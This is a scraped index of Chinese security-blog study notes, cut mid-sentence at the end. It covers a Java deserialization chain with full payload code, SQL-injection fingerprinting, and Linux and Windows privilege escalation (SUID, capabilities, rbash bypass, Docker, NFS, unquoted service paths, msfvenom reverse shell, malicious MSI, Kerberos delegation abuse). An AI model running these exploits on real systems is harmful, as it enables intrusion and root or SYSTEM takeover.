&#x2F;&#x2F; 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或 result +&#x3D; 127 * key.hashCode() ^ memberValueHashCode(value); &#125; return result;&#125; 这个方法会遍历this.memberValues属性（这个属性实质上就是HashMap内添加的属性），然后对其中每一项键值属性进行进行位运算并累加 其中memberValueHashCode函数我们也可以跟进一下 发现只要传入参数不为数组，就调用它的hashCode函数并返回。 我们来梳理一下，怎么才能调用到put方法里的equals触发代码执行：payload阶段： 建立一个map变量，其key为特殊的一个值:f5a5a608,这个值的hashCode是0，然后值为恶意templatesImpl类，然后以这个map变量为参数建立AnnotationInvocationHandler代理对象。 再向HashMap里放入一个值，键为恶意TemplatesImpl对象，再放入一个值，键为恶意AnnotationInvocationHandler对象。（LinkedHashSet会让HashMap有序，从而在反序列化的时候能按顺序依次从HashMap读取对象。如果用HashSet，则会在反序列化时报错） 反序列化阶段： 随后在readObject时，TemplatesImpl先被put方法调用。 然后在put方法里通过hash()方法获得其hash，并将其录入到它的hash属性里，然后写入到HashMap的存储队列里。 然后AnnotationInvocationHandler再被put方法调用 在对其使用hash方法获得hash时，会因其是一个代理类的缘故在hash函数内部调用hashCode()方法时会调用其代理方法hashCodeImpl。 随后在hashCodeImpl内部遍历this.memberValues变量（也就是之前初始化时放入的map变量） 将每一项的key值的hashCode与传入map vaule值作为参数的memberValueHashCode方法进行异或。这个memberValueHashCode方法会判断传入的值是否为数组，若不是数组则直接返回参数的hashCode()。 因为我们之前初始化代理对象时传入的是一个键为f5a5a608，值为eviltemplates的map，所以以上hash计算最终得到的结果，便是0^(templatesImpl.hashCode()). 也就是templatesImpl.hashCode()。所以也就是说AnnotationInvocationHandler对象作为参数传入被hash方法执行后的结果，就相当于是hash(eviltemplates) 随后这个值来到if判断逻辑，它遍历之前的值，并将遍历得到的值赋给var5 上一个值的hash（也就是eviltemplates的hash）与AnnotationInvocationHandler对象的hash（也还是eviltemplates的hash）相同，但是AnnotationInvocationHandler对象与eviltemplates对象并不相同，所以便触动了equals，代码执行成功。 完整payload纵观以上三个类，我们可以写出payload public static void main(String[] args) throws Exception &#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;); String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc); cons.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(&quot;evilClass&quot;); byte[] evilbytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for (Field Field : Fields) &#123; &#x2F;&#x2F;遍历Fields数组 try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误 Field.setAccessible(true); &#x2F;&#x2F;对数组中的每一项实现私有访问 if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123; Field.set(templates,targetByteCodes); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123; Field.set(templates,null); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123; Field.set(templates,&quot;abc&quot;); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123; Field.set(templates,new TemplatesImpl()); &#125; &#125; catch (Exception e) &#123;&#125; &#125; Map map &#x3D; new HashMap(); String magicStr &#x3D; &quot;f5a5a608&quot;; final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map); Object proxy &#x3D; Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); HashSet target &#x3D; new LinkedHashSet(); target.add(templates); target.add(proxy); &#x2F;&#x2F;这个map需要在Hashmap put了proxy后再赋值，不然会报错（我也不知道为什么 map.put(magicStr, templates); &#x2F;&#x2F; 序列化 ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(filename)); oos.writeObject(target); &#x2F;&#x2F; 反序列化 ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); 看一下调用栈 更直观的调用链 LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... &#x2F;&#x2F; TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() 总结这个链是目前调过最长的了…. 能想出这种链的绝壁是天才吧","categories":[],"tags":[{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"sql注入判断不同数据库的tips","slug":"判断不同数据库的方法tips","date":"2021-05-23T06:44:46.917Z","updated":"2021-05-04T07:51:24.714Z","comments":true,"path":"2021/05/23/判断不同数据库的方法tips/","link":"","permalink":"http://const27.com/2021/05/23/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/","excerpt":"","text":"经验之谈Asp和.net通常使用sqlserver Php通常使用mysql或者postgresql Java通常是oracle或mysql Iis服务器是基于windows的架构，后台数据库有可能是sqlserver Apache服务器，可能使用开源数据库mysql或postgresql 字符串拼接ORACLE：&#39;a&#39;||&#39;a&#39; &#x3D;aaMS-SQL：&#39;a&#39;+&#39;a&#39; &#x3D;aaMYSQL：&#39;a&#39; &#39;a&#39; &#x3D;aa 特有函数时间延迟函数oracle: 使用UTL_HTTP向一个不存在的ip发起链接请求，若返回页面大幅度延迟则可判定为oracle mssql:使用语句 waitfor delay ‘0:0:10’ 若返回页面大幅度延迟则可判定为mssql mysql: sleep函数来产生延迟 mysql特有函数BENCHMARK. 用于测试特定操作的执行速度select BENCHMARK(1000000,md5(‘admin’)) 报错尝试让语句报错，从错误信息中获取数据库信息 版本信息 系统表mssql:(select count(*) from sysobjects)&gt;0access: (select count(*) from msysobjects)&gt;0mysql:(select count(*) from information_schema.TABLES)&gt;0orcle:(select count(*) from sys.user_tables)&gt;0","categories":[],"tags":[{"name":"外围打点","slug":"外围打点","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"}]},{"title":"Linux 提权总结","slug":"Linux提权总结","date":"2021-03-12T06:33:21.708Z","updated":"2021-03-16T13:36:09.073Z","comments":true,"path":"2021/03/12/Linux提权总结/","link":"","permalink":"http://const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","excerpt":"","text":"sudo 和 suid 提权何为suid 可见在权限位置有一个s权限。那么这个s的作用是什么呢？答案是当其他用户执行该文件时，该文件会以root的身份执行。这里就涉及到了Effective UID和Real UID以及Saved UIDEffective UID: 程序实际操作时生效的UIDReal UID: 执行该程序的用户的实际UIDSaved UID: 在高权限用户降权后，保留的其原本UID (不展开说) 所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID sudo就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令 SUID与sudo提权遍历目录中的suid文件find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null 执行该命令，会得到所有suid文件 用sudo -l 查看哪些命令能被sudo可利用于提权的命令1.nmapnmap --interactive 使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权 echo &quot;os.execute(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; .&#x2F;shellnmap --script&#x3D;shell 全版本通杀提权，利用nmap可以执行指定文件的特点提权 2.findfind &#x2F; -exec command find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root. 读文件 find &#x2F;path -exec &#123;&#125; \\; 3.vimvim有了suid就可以任意文件读取了 同时也可以输入 :shell 来获取root shell 4.bashbash -p 开启一个新shell，suid的话自然是开启root shell 5.less，more和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root 6.eximexim在特定版本下会有suid提权 下载exp打就完事了 rbash 绕过何为rbashrbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下. cd 切换目录 含有斜杠 / 的命令, 譬如 /bin/sh 设置 PATH ENV 等环境变量 使用 &gt; &lt; 进行重定向 binary 的运行. 通常 root 用户会手动创建 /bin/binary_file -&gt; /home/rbash_user/bin/binary_file 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 echo $SHELL, 可以获取当前环境是否是 rbash. bypassscp bypass我在http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的 进入命令自带shell bypassman,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可一般都是在shell键入!/bin/sh来bypass rbash 下面这种方法也是可行的（似乎仅vim) :set shell&#x3D;&#x2F;bin&#x2F;bash:shell 执行上面两个语句，就bypass了 find bypasss简单概括就是-exec执行一下/bin/bash … 编程语言 bypasspython 如果python都可以用的话，那就更轻松了，os安排一下似乎pty也行?没试 python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; php php -a 进入php shell然后执行命令:exec(&quot;&#x2F;bin&#x2F;bash&quot;); perl perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; ruby ruby -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;&#39; cp bypass直接用cp把/usr/bin里的命令复制过来就行了 直接更改PATH/SHELL变量键入export -p 查看该用户的变量 如果这俩变量有w权，那么我们可以直接写入来bypass ssh bypass原理是通过ssh链接当前IP的当前用户并启动/bin/bash ssh username@Ip -t &quot;&#x2F;bin&#x2F;bash&quot; 内核提权用 uanme -a 查明内核版本 然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解 passwd和shadow明文密码/etc/passwd 默认所有用户可读，但只有root可写。/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。 但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了 passwd 可写如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的 爆破shadow如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件 计划任务文件重写计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的 ls -l &#x2F;etc&#x2F;cron* 如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权 环境变量劫持我们查看定时任务 发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如 17 * * * * root shell.sh 而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持 比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权 通配符提权https://www.secpulse.com/archives/72965.html 总结的太好了，我都不想记笔记了（偷懒 环境变量如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。 这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限， 我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。 可能有点小绕，看下面具体操作就行了。 实验室配置: 首先在一个目录下创建如下文件 vim demo.c 然后 gcc demo.c -o shell 将其编译为可执行文件 然后 chmod u+s shell 为其增加suid权限 攻击者视角: 首先使用下列指令搜寻suid权限文件 find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 发现可疑目标，执行一下看看 发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system(“ps”); 这条c语言代码。遂可尝试环境变量提权 我们依次执行以下命令 cd &#x2F;tmpecho &quot;&#x2F;bin&#x2F;bash&quot; &gt; psexport $PATH&#x3D;&#x2F;tmp:$PATH 需要修改自身环境变量的权限，但基本上都有这个权限chmod 777 .&#x2F;ps 没这条命令会导致提权失败cd &#x2F;home&#x2F;const27.&#x2F;shell 提权成功 密码查找这个提权技术说白了，就是去到处翻密码 文件内查找grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;nullfind . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; &#x2F;dev&#x2F;null \\; 我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。 查找十分钟内更改过的文件find &#x2F; -mmin -10 2&gt;&#x2F;dev&#x2F;null | grep -Ev &quot;^&#x2F;proc&quot; (不显示^&#x2F;proc文件或文件夹) capabilitiescapabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患 简介capabilities 把root的权限细分了，可以分别启用或者禁用。 在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。 如下是一些常见的特权操作及其对应capabilities 改变文件的所属者(chown()) CAP_CHOWN 向进程发送信号(kill(), signal()) CAP_KILL 改变进程的uid(setuid(), setreuid(), setresuid()等) CAP_SETUID trace进程(ptrace()) CAP_SYS_PTRACE 设置系统时间(settimeofday(), stime()等) CAP_SYS_TIME 忽略文件读及目录搜索的DAC访问限制 CAP_DAC_READ_SEARCH 关于capabilities的管理工具有如下: getcap setcap capsh filecap getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。 我们可以通过以下指令搜索设置了capabilities的可执行文件 getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null 实操通过cap_setuidcap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。 以python为例 我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权 python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; 类似的有很多。 perl perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; gdb gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit php php -r &quot;posix_setuid(0); system(&#39;&#x2F;bin&#x2F;sh&#39;);&quot; python python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; rvim 需要支持python3模块。 rvim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39; vim 需要支持python3模块。vim --version查询，是否支持py3 vim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39; 通过CAP_DAC_READ_SEARCHcap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。 利用此特性我们可以读取系统中的敏感信息。 如果tar有此权限，我们可以通过此来查看敏感文件内容。 tar cvf shadow.tar &#x2F;etc&#x2F;shadow &#x2F;&#x2F;创建压缩文件tar -xvf shadow.tar &#x2F;&#x2F;解压缩cd etc &#x2F;&#x2F;进入解压缩的目录chmod +r shadow &#x2F;&#x2F;赋予读权限cat shadow | grep root &#x2F;&#x2F;查看shadow文件的内容 DockerDocker用户组提权如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权 首先我们执行如下命令 docker run -v &#x2F;:&#x2F;mnt --rm -it crf_web1 chroot &#x2F;mnt sh 然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了） 然后退出来，直接尝试 su root2 提权成功 NFSNFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题 no_root_squash我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。 也就是说，任何机器的root在此目录上都有最高权限。 我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权 mkdir &#x2F;tmp&#x2F;nfsmount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs 将本机上的&#x2F;tmp&#x2F;nfs 挂载到共享目录cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;nfs&#x2F;bashchmod u+s &#x2F;tmp&#x2F;nfs&#x2F;bash 设置共享目录上bash的suid 回到低权限机，执行 /tmp/bash 完成提权","categories":[],"tags":[{"name":"提权","slug":"提权","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"Windows提权方法汇总","slug":"Windows提权","date":"2021-02-19T09:21:51.308Z","updated":"2021-02-19T08:50:44.681Z","comments":true,"path":"2021/02/19/Windows提权/","link":"","permalink":"http://const27.com/2021/02/19/Windows%E6%8F%90%E6%9D%83/","excerpt":"","text":"无引号服务路径 （ Trusted Service Paths ）先说实用度，比较被动，而且比较看脸。 Windows下服务的权限通常是SYSTEM。如果我们能够替换服务的启动程序为我们的恶意程序（如反弹shell），即相当于获得了SYSTEM权限，达到了提权的目的。无引号服务路径有可能会导致这种情况的发生。所谓无引号服务路径，就是服务启动程序的路径中包含了空格且未被引号包含起来。比如这样 C:\\Program Files\\floder1\\service.exe 因为空格的存在，Windows在启动服务找寻服务启动项时，它会按照以下顺序进行启动项寻找 C:\\Program.exeC:\\Program Files\\Some.exeC:\\Program Files\\Some Folder\\Service.exe 这就给了我们有机可乘的机会：如果我们在服务的上层目录有写入或完全控制权限，我们完全可以将一个可执行文件放在Windows搜寻服务启动项的更靠前顺序上。 我们用以下命令来搜索哪些服务路径没有包含引号 wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\\Windows\\\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot; 找到一个。接下来我们的思路可能就是在2345Explorer目录下创建一个Protect.exe了，所以我们要看看2345Explorer目录我们的权限如何。 先来一手whoami /all.发现自己是Users组的。 然后使用icacls命令查看在2345Explorer目录的权限如何 users组是完全控制权（F），那么我们直接用msfvenom构造一个反弹shell的exe。命名为Protect.exe，放入2345Explorer目录。我这里随便编码了一下 msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http -e x86&#x2F;shikata_ga_nai LHOST&#x3D;192.168.111.129 LPORT&#x3D;10068 -f exe -o Protect.exe 然后我们现在是没有能力重启服务的。。只能等管理员重启服务或者机子重启。然后就拿到SYSTEM权限了。但是这里还有一个坑点，这个坑点是如果一个服务启动后在一定时间内未与 Service Control Manager(SCM) 通讯，就会被停止。 所以我们要在拿到shell后及时的转移进程或者添加管理员账户。转移进程在msf中很简单，meterpreter中先用ps查看进程，随便找一个system权限，记住其pid，然后 migrate PID 即可完成进程迁移。 下面来说说防治方法吧。进入注册表修改窗口，在 HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services 路径下找到存在漏洞的服务，修改其ImagePath，把路径前后加个引号就可了。 易受攻击的服务（Vulnerable Services ）同样看脸且被动 这个攻击方法大致分两类1.替换服务的二进制文件。这个方法较为简单，如果对服务二进制文件所在目录有修改权，那么我们完全可以创建一个恶意程序来替换原有的二进制文件服务。这个比较简单，而且基本上攻击流程和Trusted Service Paths如出一辙，同样也是比较被动地等待重启服务才能弹shell，就不再演示了。2.修改服务的属性。如果我们能修改服务的 BINARY_PATH_NAME 属性（这个属性用于指向服务的二进制文件），我们就可以通过设置 BINARY_PATH_NAME 的值为系统命令，然后重启服务时我们的系统命令会被执行。 对于后者，我们需要一款工具来快速揭示出我们能修改哪些服务的属性。这个工具我们采用accesschk.exe，它是微软产出的，基本不会报毒。 我们通过该工具执行以下命令 accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteulaoraccesschk.exe -uwcqv &quot;Users&quot; * &#x2F;accepteula来查看Users组（根据实际情况来填哪个组）对哪些服务有哪些权限 如果对某个服务有service_all_access或者以下权限，就说明能对其属性进行修改。 比如我们对Spooler服务有service_all_access权限，我们就可以这样做。通过修改其binPath为恶意指令，然后等待管理员重启服务，我们的恶意指令就会被执行。 AlwaysInstallElevated如果windows启用了如下注册表项 [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer]“AlwaysInstallElevated”&#x3D;dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer]“AlwaysInstallElevated”&#x3D;dword:00000001 那么所有msi（windows应用安装程序）都会以SYSTEM权限运行。此时如果我们执行一个恶意msi程序，即可达到提权目的同时需要注意的一点是，这个注册表项不一定总是存在的。（比如我的实验机 我们可以通过reg query来验证这两条注册表项的情况 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevated 若均为1，我们就可以通过msfvenom生成恶意msi来提权 msfvenom -p windows&#x2F;adduser USER&#x3D;rottenadmin PASS&#x3D;P@ssword123! -f msi -o rotten.msi 然后执行，获得一个管理员账户。 信息泄露Unattend.xml sysprep.xml和sysprep.inf文件GPP.xml 存在着一定信息泄露，他们通常存在于以下路径 C:\\Windows\\Panther\\C:\\Windows\\Panther\\Unattend\\C:\\Windows\\System32\\C:\\Windows\\System32\\sysprep\\ 找到后，找到 Unattend.xml 文件中的 标签。就有可能找到用户的加密后的密码。。 &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount&gt; &lt;Password&gt; &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ&#x3D;&lt;&#x2F;Value&gt; &#x2F;&#x2F;PASSWORD &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt; &lt;&#x2F;Password&gt; &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt; &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt; &lt;Group&gt;Administrators&lt;&#x2F;Group&gt; &lt;Name&gt;Administrator&lt;&#x2F;Name&gt; &lt;&#x2F;LocalAccount&gt; &lt;&#x2F;LocalAccounts&gt;&lt;&#x2F;UserAccounts&gt;一些敏感文件查询指令C:\\Users\\user\\Desktop&gt; dir C:\\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \\*password\\*reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;sreg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s 基于资源的域委派攻击refer:https://xz.aliyun.com/t/7454 原理的几个点：1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: RestrictedKrbHost/domain和HOST/domain这两个SPN 攻击流程:假设开启基于资源的约束性委派机器为A1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。4.用ST2访问A的CIFS服务，权限获得。 实操这个攻击说白了就是个提权… 首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。 我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller 可以获得域控WIN版本 然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。 我们依旧使用powerview。先调用Get-DomainUser -Identity username -Properties objectsid来获取当前用户SID然后Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125; 查看当前用户对某台主机是否有写权限。 如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。如图看到我们对WIN7进行操作 好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force) 好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 msDS-AllowedToActOnBehalfOfOtherIdentity属性的值 ，这个操作我们用powerview实现。 $SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot; #这儿的sid是我们创建的#机器用户#evilsystem的sid$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose 至于机器账户SID怎么获得，powerview下的 get-domiancomputer hacksystem然后使用Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity 查看委派是否设置成功 Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose 此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值 现在都统统设置好了，开始下一步吧。网上一般用的rubeus，这里我用kekeo吧 Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx 本地运算出机器用户ntlm hash 这里借用一下别人的图 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt 写入票据 然后我在本机使用以上方法后klist一下，发现确实存在票据 但是dir \\test1\\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了 敏感用户不可委派的绕过 若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。 我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt继续实验administrator，发现确实是这样 此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据 可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具https://www.pkisolutions.com/tools/asn1editor/但实际上rubeus也能完成票据修改rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt 完事 POTATO 家族hot potato热土豆提权。很早前就听说过了，但一直没去了解过。前置知识是ntlm relay,可以去了解了解。 potato家族有很多，hot potato只是其中一种提权方式。我环境有问题，不能很好的复现🙃，抓包分析啥的先咕咕吧。 https://github.com/foxglovesec/Potato👈工具https://foxglovesecurity.com/2016/01/16/hot-potato/ 👈HOT POTATO技术文档，国内基本上翻译这个来的。 提权步骤大概是这个流程1.本地nbns服务欺骗2.wpad劫持3.HTTP-&gt;SMB 的 ntlm relay 1.本地nbns服务欺骗 Windows域名解析规则是本地HOST文件-》dns查询-》NBNS或者LLMNR查询一旦本地发出NBNS查询，我们本地就可以迅速响应，啪的一下就响应了，很快啊，本地发包很快，只要发出NBNS包基本上都能被我们本地发包响应。但是以上步骤还是有一些细节的：我们当前并非管理员权限，大几率是无法嗅探本地流量的,如果我们能够事先知道目标主机期望NBNS查询获得的主机名，我们可以伪造一个响应，对发送NBNS查询的那个主机快速的大量发送NBNS响应 .但是nbns流量包还有个叫特征码的东西，请求包和响应包的特征码必须相同，所以我们被迫发送65536个包爆破这个特征码——本地发包速度很快，本地NBNS欺骗成功率基本上在100%。 2.WPAD劫持 NBNS欺骗后我们就可以劫持WPAD的域名，把自己伪造称WPAD并返回自定义的PAC文件。意味着我们可以把本地发出的所有流量重定向。 3.RELAY 在现在这个年代，SMB-&gt;SMB的relay很少用到了，微软 